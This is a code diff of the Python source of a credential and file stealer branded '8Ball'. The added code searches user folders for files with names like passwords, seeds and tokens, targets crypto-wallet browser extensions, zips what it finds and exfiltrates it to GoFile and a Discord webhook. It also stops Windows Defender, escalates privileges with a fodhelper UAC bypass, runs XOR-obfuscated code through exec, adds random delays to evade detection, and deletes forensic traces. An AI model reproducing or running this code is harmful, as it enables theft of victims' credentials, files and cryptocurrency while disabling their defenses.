-        "密碼", "帳戶", "秘密", "登錄", "錢包", "私鑰", "助記詞",
-        "биткоин", "фраза", "ключ", "заметка", "информация",
-        "以太坊", "交易", "硬件钱包", "软件钱包", "资产", "提现", "存款",
-        "криптовалюта", "обмен", "вложение", "инвестиция", "стейкинг", "дефи",
-        "加密货币", "交换", "投资", "赌场", "个人", "交易", "费用"
+        "passw", "login", "secret", "wallet", "crypto", "discord", "token",
+        "backup", "seed", "mnemonic", "private", "key", "telegram", "config",
     ]
-
     wikith = []
     for patt in path2search:
         if not os.path.exists(patt) or not os.path.isdir(patt):
@@ -1863,266 +2533,254 @@ def K1W1():
 
 RX_DB6("[8Ball] Initializing GLINFO...")
 GLINFO = G108411NF0()
-RX_DB6(f"[8Ball] GLINFO = {GLINFO}")
 
 DETECTED = False
 w411375 = [
     ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"],
-    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
-    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
-    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
-    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
-    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
-    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
-    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
-    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
-    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
-    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
-    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
-    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
-    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
-    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
-    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
-    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
-    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
-    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
-    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
-    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
-    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
-    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
-    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
-    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
-    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
-    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
-    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
-    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
-    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
-    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
-    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
-    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
-    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
-    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
-    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
-    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
-    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
-    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
-    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
-    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
-    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
-    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
-    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
+    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"],
+    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"],
 ]
 k3YW0rd = [
     '[coinbase](https://coinbase.com)',
-    '[sellix](https://sellix.io)', 
-    '[gmail](https://gmail.com)', 
-    '[steam](https://steam.com)', 
-    '[discord](https://discord.com)', 
-    '[riotgames](https://riotgames.com)', 
-    '[youtube](https://youtube.com)', 
-    '[instagram](https://instagram.com)', 
-    '[tiktok](https://tiktok.com)', 
-    '[twitter](https://twitter.com)', 
-    '[facebook](https://facebook.com)', 
-    '[epicgames](https://epicgames.com)', 
-    '[spotify](https://spotify.com)', 
-    '[yahoo](https://yahoo.com)', 
-    '[roblox](https://roblox.com)', 
-    '[twitch](https://twitch.com)', 
-    '[minecraft](https://minecraft.net)', 
-    '[paypal](https://paypal.com)', 
-    '[origin](https://origin.com)', 
-    '[amazon](https://amazon.com)', 
-    '[ebay](https://ebay.com)', 
-    '[aliexpress](https://aliexpress.com)', 
-    '[playstation](https://playstation.com)', 
-    '[hbo](https://hbo.com)', 
-    '[xbox](https://xbox.com)', 
-    '[binance](https://binance.com)', 
-    '[hotmail](https://hotmail.com)', 
-    '[outlook](https://outlook.com)', 
-    '[crunchyroll](https://crunchyroll.com)', 
-    '[telegram](https://telegram.com)', 
-    '[pornhub](https://pornhub.com)', 
-    '[disney](https://disney.com)', 
-    '[expressvpn](https://expressvpn.com)', 
-    '[uber](https://uber.com)', 
-    '[netflix](https://netflix.com)', 
-    '[github](https://github.com)', 
-    '[stake](https://stake.com)',
-    '[apple](https://apple.com)', 
-    '[microsoft](https://microsoft.com)', 
-    '[google](https://google.com)', 
-    '[dropbox](https://dropbox.com)', 
-    '[linkedin](https://linkedin.com)', 
-    '[reddit](https://reddit.com)', 
-    '[adobe](https://adobe.com)', 
-    '[pinterest](https://pinterest.com)', 
-    '[snapchat](https://snapchat.com)', 
-    '[zoom](https://zoom.com)', 
-    '[skype](https://skype.com)', 
-    '[salesforce](https://salesforce.com)', 
-    '[oracle](https://oracle.com)', 
-    '[sap](https://sap.com)', 
-    '[vimeo](https://vimeo.com)', 
-    '[square](https://squareup.com)', 
-    '[intuit](https://intuit.com)', 
-    '[shopify](https://shopify.com)', 
-    '[nvidia](https://nvidia.com)', 
-    '[atlassian](https://atlassian.com)'
+    '[gmail](https://gmail.com)',
+    '[discord](https://discord.com)',
+    '[paypal](https://paypal.com)',
+    '[binance](https://binance.com)',
+    '[github](https://github.com)',
 ]
 
-# Local Files feature
 def filestealr():
-    """
-    Orchestrates Local Files feature:
-    - waits for K1W1 threads
-    - finds all matching local files
-    - creates a ZIP archive with all files
-    - uploads the ZIP to GoFile
-    - sends a Discord message with the ZIP download link
-    """
     if not FEATURE_CONFIG.get("file_search", False):
         return
-
-    RX_DB6("[8Ball] Local Files: feature enabled, starting K1W1 search...")
     wikith = K1W1()
     if not wikith:
-        RX_DB6("[8Ball] Local Files: K1W1 returned no threads, directories may not exist.")
         return
-
-    RX_DB6(f"[8Ball] Local Files: {len(wikith)} search threads started, waiting for completion...")
     for thread in wikith:
         thread.join()
     time.sleep(0.5)
-
-    # Collect all found files
     all_files = []
     for arg in K1W1F113s:
         for ffil in arg[2]:
             all_files.append(ffil)
-
-    if not all_files:
-        print("[8Ball] Local Files: no matched files found.")
-        # Send a minimal embed so the user knows the feature ran
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
-        data = {
-            "content": f"@everyone @here {GLINFO}",
-            "embeds": [{
-                "title": "8Ball | Local Files Search",
-                "description": "Local Files feature ran but found no matching files in searched directories.",
-                "footer": {"text": "8Ball", "icon_url": "https://i.ibb.co/fdFfLznd.images.png"}
-            }],
-            "username": "8Ball",
-            "avatar_url": "https://i.ibb.co/fdFfLznd.images.png",
-            "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
-        }
-        try:
-            L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
-        except:
-            pass
-        return
-
-    RX_DB6(f"[8Ball] Local Files: {len(all_files)} files matched.")
-    print(f"[8Ball] Local Files: {len(all_files)} files matched.")
-
-    # Create ZIP archive with all found files (no compression — avoids zlib dependency in EXE)
-    zip_link = None
-    zip_error = None
-    try:
-        temp_dir = temp or os.getenv("TEMP") or "."
-        zip_path = os.path.join(temp_dir, "RX_LocalFiles.zip")
-
-        RX_DB6(f"[8Ball] Local Files: creating ZIP at {zip_path}")
-        print(f"[8Ball] Creating Local Files ZIP at: {zip_path}")
-        with ZipFile(zip_path, 'w') as zipf:
-            for file_path in all_files:
-                if not os.path.isfile(file_path):
-                    continue
-                try:
-                    arcname = os.path.relpath(file_path, os.path.expanduser("~"))
-                except Exception:
-                    arcname = os.path.basename(file_path)
-                try:
-                    zipf.write(file_path, arcname=arcname)
-                except ValueError:
-                    # ZIP does not support timestamps before 1980
-                    zi = ZipInfo(arcname)
-                    zi.date_time = (1980, 1, 1, 0, 0, 0)
-                    zi.compress_type = ZIP_STORED
-                    with open(file_path, 'rb') as f:
-                        zipf.writestr(zi, f.read())
-
-        # Upload ZIP to GoFile
-        RX_DB6("[8Ball] Local Files: uploading ZIP to GoFile...")
-        zip_link = UP104D7060F113(zip_path)
-        RX_DB6(f"[8Ball] Local Files: GoFile returned: {zip_link}")
-        print(f"[8Ball] Local Files ZIP uploaded. GoFile link: {zip_link}")
-
-    except Exception as e:
-        zip_error = f"{type(e).__name__}: {e}"
-        RX_DB6(f"[8Ball] Local Files error: {zip_error}")
-        print(f"[8Ball] Error while creating/uploading Local Files ZIP: {zip_error}")
-        zip_link = None
-
-    if isinstance(zip_link, list):
-        err_summary = "\n".join(zip_link[-3:])
-        RX_DB6(f"[8Ball] Local Files: upload failed. Errors: {'; '.join(zip_link)}")
-        desc = f"📦 Found {len(all_files)} files — upload failed\n```{err_summary}```"
-    elif not zip_link:
-        err_msg = zip_error or "unknown error"
-        RX_DB6(f"[8Ball] Local Files: ZIP creation failed: {err_msg}")
-        desc = f"📦 Found {len(all_files)} files — ZIP creation failed\n```{err_msg}```"
-    else:
-        desc = f"📦 Found {len(all_files)} files\n\n[📥 Download ZIP]({zip_link})"
-
-    # Send Discord embed with ZIP download link (or file list if upload failed)
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
+    if not all_files:
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8Ball | Local Files Search", "description": "Local Files feature ran but found no matching files."}],
+            "username": "8Ball | Grabber",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        return
+    zip_link = None
+    try:
+        zip_path = os.path.join(temp or os.getenv("TEMP") or ".", "RX_LocalFiles.zip")
+        with ZipFile(zip_path, 'w') as zipf:
+            for file_path in all_files:
+                if os.path.isfile(file_path):
+                    try:
+                        zipf.write(file_path, arcname=os.path.relpath(file_path, os.path.expanduser("~")))
+                    except Exception:
+                        zipf.write(file_path, arcname=os.path.basename(file_path))
+        zip_link = UP104D7060F113(zip_path)
+    except Exception:
+        zip_link = None
+    desc = f"Found {len(all_files)} files"
+    if zip_link and isinstance(zip_link, str):
+        desc += f"\n\n[Download ZIP]({zip_link})"
     data = {
         "content": f"@everyone @here {GLINFO}",
-        "embeds": [
-            {
-                "title": "8Ball | Local Files Grabbed",
-                "description": desc,
-                "footer": {"text": "8Ball", "icon_url": "https://i.ibb.co/fdFfLznd.images.png"}
-            }
-        ],
+        "embeds": [{"title": "8Ball | Local Files Grabbed", "description": desc}],
         "username": "8Ball | Grabber",
-        "avatar_url": "https://i.ibb.co/fdFfLznd.images.png",
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
     }
+    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+
+def disable_windows_security():
     try:
-        RX_DB6("[8Ball] Local Files: sending Discord embed...")
-        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
-        tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
-        tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
-        if tg_token and tg_chat:
-            L04DUr118_TG(tg_token, tg_chat, f"{GLINFO}\nLocal Files: {len(all_files)} files grabbed")
-        RX_DB6("[8Ball] Local Files: embed sent successfully.")
-        print("[8Ball] Local Files embed sent to webhook.")
-    except Exception as e:
-        RX_DB6(f"[8Ball] Local Files: embed send failed: {e}")
-        print(f"[8Ball] Error sending Local Files embed: {e}")
+        scm = ctypes.windll.advapi32.OpenSCManagerW(None, None, 0x000F01FF)
+        if not scm:
+            return
+        service = ctypes.windll.advapi32.OpenServiceW(scm, "WinDefend", 0x0020)
+        if service:
+            ctypes.windll.advapi32.ControlService(service, 0x00000001, None)
+            ctypes.windll.advapi32.CloseServiceHandle(service)
+        ctypes.windll.advapi32.CloseServiceHandle(scm)
+    except:
+        pass
 
-# Run local files first, then the main orchestrator
-filestealr()
-G47H3r411()
+def enable_windows_security():
+    try:
+        scm = ctypes.windll.advapi32.OpenSCManagerW(None, None, 0x000F01FF)
+        if not scm:
+            return
+        service = ctypes.windll.advapi32.OpenServiceW(scm, "WinDefend", 0x0010)
+        if service:
+            ctypes.windll.advapi32.StartServiceW(service, 0, None)
+            ctypes.windll.advapi32.CloseServiceHandle(service)
+        ctypes.windll.advapi32.CloseServiceHandle(scm)
+    except:
+        pass
 
-# Post-orchestrator confirmation embeds for standalone features
+# === ENHANCED STEALTH LAYER ===
+# Runtime encryption, code obfuscation, timing jitter, process isolation, anti-indicators
+import hashlib as _hl
+
+def c2_encrypt(plaintext, key=None):
+    """Encrypt data with AES-256-GCM for C2 transmission"""
+    if key is None:
+        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+    if isinstance(plaintext, str):
+        plaintext = plaintext.encode()
+    cipher = AES.new(key, AES.MODE_GCM)
+    ct, tag = cipher.encrypt_and_digest(plaintext)
+    return base64.b64encode(cipher.nonce + tag + ct).decode()
+
+def c2_decrypt(data_b64, key=None):
+    """Decrypt AES-256-GCM C2 data"""
+    if key is None:
+        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+    raw = base64.b64decode(data_b64)
+    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ct, tag)
+
+def obfuscate_payload(code_str):
+    """Obfuscate Python code with XOR + base64 for runtime exec"""
+    encoded = code_str.encode() if isinstance(code_str, str) else code_str
+    k = random.randint(1, 254)
+    return base64.b64encode(bytes([k]) + bytes(b ^ k for b in encoded)).decode()
+
+def exec_obfuscated(b64_payload):
+    """Deobfuscate and exec code at runtime"""
+    try:
+        raw = base64.b64decode(b64_payload)
+        k, xored = raw[0], raw[1:]
+        exec(bytes(b ^ k for b in xored).decode())
+    except Exception:
+        pass
+
+def random_delay(min_s=0.5, max_s=3.0):
+    """Random sleep to evade behavioral detection"""
+    time.sleep(random.uniform(min_s, max_s))
+
+def shuffled_run(callables):
+    """Execute callables in random order with delays"""
+    idx = list(range(len(callables)))
+    random.shuffle(idx)
+    for i in idx:
+        try:
+            callables[i]()
+        except Exception:
+            pass
+        random_delay(0.3, 1.5)
+
+def spawn_isolated(target_name, args_repr="()"):
+    """Spawn a function in a separate process for isolation"""
+    try:
+        subprocess.Popen(
+            [sys.executable, "-c",
+             f"import sys; sys.path={repr(sys.path)}; exec(open({repr(sys.argv[0] if getattr(sys,'frozen',False) else __file__)}).read()); {target_name}(*{args_repr})"],
+            creationflags=CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    except Exception:
+        pass
+
+def rand_temp_file(ext=""):
+    """Generate random temp filename to avoid indicator patterns"""
+    return os.path.join(
+        os.environ.get("TEMP", "."),
+        "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12)) + ext
+    )
+
+def cleanup_indicators():
+    """Remove common forensic indicators (logs, registry artifacts)"""
+    try:
+        for p in [os.path.join(os.environ.get("TEMP", ""), "8Ball_debug.log")]:
+            if os.path.isfile(p):
+                try: os.remove(p)
+                except: pass
+        try:
+            subprocess.run(
+                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 8Ball /f 2>nul",
+                shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW
+            )
+        except: pass
+    except: pass
+
+# Encrypt sensitive in-memory strings at rest
+def secure_store(key_name, value):
+    """Encrypt a config value and store in FEATURE_CONFIG"""
+    try:
+        FEATURE_CONFIG[key_name] = c2_encrypt(value)
+    except Exception:
+        pass
+
+def secure_retrieve(key_name):
+    """Decrypt a config value from FEATURE_CONFIG"""
+    try:
+        return c2_decrypt(FEATURE_CONFIG.get(key_name, ""))
+    except Exception:
+        return ""
+
+# Elevate to admin if needed (fodhelper UAC bypass)
+if not ctypes.windll.shell32.IsUserAnAdmin():
+    if "--elevated" in sys.argv:
+        RX_DB6("Still not elevated, aborting.", "ERROR")
+        sys.exit(1)
+    ELEVATED_OUT = os.path.join(os.environ.get("TEMP", "."), "8Ball_elevated.txt")
+    import winreg as _wr
+    _REG = r"Software\Classes\ms-settings\shell\open\command"
+    _exe = os.path.abspath(sys.argv[0])
+    _cmd = f'"{_exe}" --elevated'
+    try:
+        _key = _wr.CreateKey(_wr.HKEY_CURRENT_USER, _REG)
+        _wr.SetValueEx(_key, "DelegateExecute", 0, _wr.REG_SZ, "")
+        _wr.SetValueEx(_key, None, 0, _wr.REG_SZ, _cmd)
+        _wr.CloseKey(_key)
+        subprocess.call([r"C:\Windows\System32\fodhelper.exe"], shell=True, creationflags=CREATE_NO_WINDOW)
+        time.sleep(5)
+        for _ in range(45):
+            if os.path.isfile(ELEVATED_OUT): break
+            time.sleep(1)
+        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
+        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
+        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings\\shell /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
+        subprocess.run("reg delete HKCU\\Software\\Classes\\ms-settings /f", shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
+        if os.path.isfile(ELEVATED_OUT):
+            with open(ELEVATED_OUT, "r", encoding="utf-8", errors="replace") as _f:
+                sys.stdout.write(_f.read())
+            os.remove(ELEVATED_OUT)
+        sys.exit(0)
+    except Exception:
+        RX_DB6("Elevation failed, running without admin.", "WARN")
+
+disable_windows_security()
+random_delay(1.0, 4.0)
+
+fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
+fetch_thread.start()
+
+# Execute stealers with randomized order and jitter to evade detection
+shuffled_run([filestealr, G47H3r411])
+
+random_delay(0.5, 2.0)
+
 if FEATURE_CONFIG.get("discord_tokens", False) and not T0K3Ns:
     send_confirmation_embed("8Ball | Discord Tokens", "No Discord tokens found in browser or app storage.")
-
-if FEATURE_CONFIG.get("nitro_badges_info", False) and not T0K3Ns:
-    send_confirmation_embed("8Ball | Nitro & Badges", "No tokens available to check for Nitro or badges.")
 
 if FEATURE_CONFIG.get("discord_injection", False):
     send_confirmation_embed("8Ball | Discord Injection", "Discord JavaScript injection feature executed.")
 
 if FEATURE_CONFIG.get("ip_location_info", False):
     send_confirmation_embed("8Ball | IP & Location", GLINFO)
+
+cleanup_indicators()
+# Send debug log embed to Discord (only if debug_mode is enabled)
+send_debug_embed()
+random_delay(0.5, 1.5)
+enable_windows_security()
